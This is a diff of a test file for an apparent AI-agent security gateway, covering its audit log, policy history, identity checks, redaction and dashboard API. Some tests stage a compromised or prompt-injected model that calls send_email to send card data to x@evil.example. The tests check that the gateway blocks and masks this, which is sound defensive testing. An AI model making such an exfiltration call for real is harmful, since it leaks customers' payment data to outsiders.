@@ -142,10 +142,12 @@ def test_audit_chain_verifies_and_detects_tampering(gw):
     gw.upstream.next_reply = {"text": "ok"}
     for i in range(3):
         gw.chat("alice", user(f"hi {i}"))
-    assert gw.client.get("/api/audit/verify").json() == {"ok": True, "entries": 3, "head": gw.app.state.engine.audit.events[-1]["hash"]}
+    n = len(gw.app.state.engine.audit.events)  # 3 exchanges + the startup policy entry
+    assert gw.client.get("/api/audit/verify").json() == {"ok": True, "entries": n, "head": gw.app.state.engine.audit.events[-1]["hash"]}
 
     path = gw.app.state.engine.audit.path
     lines = path.read_text().splitlines()
+    assert json.loads(lines[1]).get("type") == "exchange"
     e = json.loads(lines[1])
     e["outcome"] = "allowed" if e["outcome"] != "allowed" else "blocked"  # someone rewrites history
     lines[1] = json.dumps(e)
@@ -157,7 +159,7 @@ def test_audit_chain_verifies_and_detects_tampering(gw):
 def test_every_audit_entry_names_its_policy_version(gw):
     gw.upstream.next_reply = {"text": "ok"}
     gw.chat("alice", user("hi"))
-    e = gw.client.get("/api/events").json()[0]
+    e = gw.client.get("/api/events?type=exchange").json()[0]
     assert e["policy_version"] and e["profile"] == "balanced" and "controls_ms" in e
 
 
@@ -174,7 +176,8 @@ def test_audit_export_is_jsonl(gw):
     gw.upstream.next_reply = {"text": "ok"}
     gw.chat("alice", user("hi"))
     r = gw.client.get("/api/audit/export")
-    assert r.status_code == 200 and json.loads(r.text.splitlines()[0])["seq"] == 0
+    lines = [json.loads(x) for x in r.text.splitlines()]
+    assert r.status_code == 200 and lines[0]["seq"] == 0 and {e.get("type") for e in lines} == {"policy_change", "exchange"}
 
 
 # ---------- the demo scenario, end to end through the agent loop ----------
@@ -231,7 +234,7 @@ def test_live_jev_flags_the_poisoned_record():
 def test_request_without_key_is_denied_and_audited(gw):
     r = gw.chat("mallory", user("hi"))  # mallory has no key
     assert r.status_code == 401
-    e = gw.client.get("/api/events").json()[0]
+    e = gw.client.get("/api/events?type=exchange").json()[0]
     assert e["outcome"] == "blocked" and e["decisions"][0]["control"] == "identity"
 
 
@@ -257,7 +260,7 @@ def test_purpose_is_required_and_recorded(gw):
     assert r.status_code == 400
     gw.upstream.next_reply = {"text": "ok"}
     gw.chat("alice", user("hi"), headers={"X-Purpose": "refund case 1234"})
-    e = gw.client.get("/api/events").json()[0]
+    e = gw.client.get("/api/events?type=exchange").json()[0]
     assert e["purpose"] == "refund case 1234" and e["agent"] == "support-assistant"
 
 
@@ -281,3 +284,79 @@ def test_header_mode_still_denies_anonymous(gw):
     assert gw.chat("mallory", user("hi")).status_code == 401  # no X-User at all
     gw.upstream.next_reply = {"text": "ok"}
     assert gw.chat("mallory", user("hi"), headers={"X-User": "mallory"}).status_code == 200
+
+
+# ---------- dashboard API ----------
+
+CARD_RESULT = [{"role": "assistant", "content": None, "tool_calls": [{"id": "c", "type": "function", "function": {"name": "get_customer", "arguments": "{}"}}]},
+               {"role": "tool", "tool_call_id": "c", "content": '{"card": "4111 1111 1111 1111", "iban": "PL61109010140000071219812874", "notes": "ok"}'}]
+
+
+def test_excerpts_show_context_but_never_real_values(gw):
+    gw.upstream.next_reply = {"tool_call": {"name": "send_email", "arguments": {"to": "x@evil.example", "subject": "s", "body": "5555 5555 5555 4444"}}}
+    gw.chat("alice", user("look up") + CARD_RESULT)
+    raw = gw.app.state.engine.audit.path.read_text()
+    for real in ("4111 1111 1111 1111", "4111111111111111", "PL61109010140000071219812874", "5555 5555 5555 4444"):
+        assert real not in raw, f"{real} leaked into the audit log"
+    ex = [d for d in gw.client.get("/api/events?type=exchange").json()[0]["decisions"] if d["excerpt"]]
+    assert any("[[CARD#" in d["excerpt"] for d in ex)  # the redacted tool result
+    assert any("send_email" in d["excerpt"] and "[CARD]" in d["excerpt"] for d in ex)  # the blocked call, masked
+
+
+def test_policy_change_is_diffed_and_audited(gw):
+    gw.edit_policy(lambda p: p["controls"]["injection.jev"].update(threshold=0.5))
+    gw.client.get("/api/health")
+    h = gw.client.get("/api/policy/history").json()
+    assert {"what": "controls.injection.jev.threshold", "old": 0.8, "new": 0.5} in h[0]["changes"]
+    assert h[0]["previous"] == h[1]["version"]
+    audited = gw.client.get("/api/events?type=policy_change").json()
+    assert audited[0]["changes"] == h[0]["changes"]
+
+
+def test_rejected_policy_edit_is_reported_in_history(gw):
+    gw.policy_path.write_text("active_profile: does-not-exist\n")
+    os.utime(gw.policy_path, None)
+    gw.client.get("/api/health")
+    assert "kept the last good policy" in gw.client.get("/api/policy/history").json()[0]["error"]
+
+
+def test_sessions_list_and_detail(gw):
+    gw.upstream.next_reply = {"text": "ok"}
+    gw.chat("alice", user("look up") + CARD_RESULT, session="case-1")
+    lst = gw.client.get("/api/sessions").json()
+    assert lst[0]["session"] == "case-1" and "CARD" in lst[0]["labels"]
+    d = gw.client.get("/api/sessions/case-1").json()
+    assert d["user"] == "alice" and d["role"] == "support_junior" and d["tokens_issued"] >= 2 and len(d["steps"]) == 1
+    assert gw.client.get("/api/sessions/nope").status_code == 404
+
+
+def test_timeseries_counts_this_minute(gw):
+    gw.upstream.next_reply = {"tool_call": {"name": "charge_card", "arguments": {"card_number": "x", "amount_pln": 1}}}
+    gw.chat("alice", user("charge"))
+    ts = gw.client.get("/api/metrics/timeseries?minutes=5").json()
+    assert len(ts) == 5 and ts[-1]["requests"] == 1 and ts[-1]["blocks_by_control"] == {"access.tools": 1}
+
+
+def test_metrics_ignore_policy_entries(gw):
+    gw.edit_policy(lambda p: p.__setitem__("active_profile", "strict"))
+    gw.client.get("/api/health")
+    assert gw.client.get("/api/metrics").json()["requests"] == 0
+
+
+def test_try_it_runs_the_demo_through_every_control(gw, tmp_path, monkeypatch):
+    sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "demo"))
+    import world
+    monkeypatch.setattr(world, "OUTBOX", tmp_path / "outbox.jsonl")
+    gw.edit_policy(lambda p: p["controls"]["injection.jev"].update(action="allow"))  # AI check off: the flow rule must hold
+    gw.upstream.next_reply = None  # the scripted compromised model drives the loop
+    r = gw.client.post("/api/try", json={"user": "alice", "prompt": "Customer 7 asked about their card limit."}).json()
+    kinds = [s["kind"] for s in r["steps"]]
+    assert kinds[:2] == ["model", "tool"] and not (tmp_path / "outbox.jsonl").exists()
+    assert "5555" not in r["steps"][1]["result_preview"].replace("****4444", "")
+    blocked = [d for s in r["steps"] if s["kind"] == "model" for d in s["acl"]["decisions"] if d["action"] == "block"]
+    assert blocked and blocked[0]["control"] == "flow.sensitive_to_external"
+    assert gw.client.get(f"/api/sessions/{r['session']}").status_code == 200
+
+
+def test_try_it_rejects_unknown_users(gw):
+    assert gw.client.post("/api/try", json={"user": "mallory", "prompt": "hi"}).status_code == 400
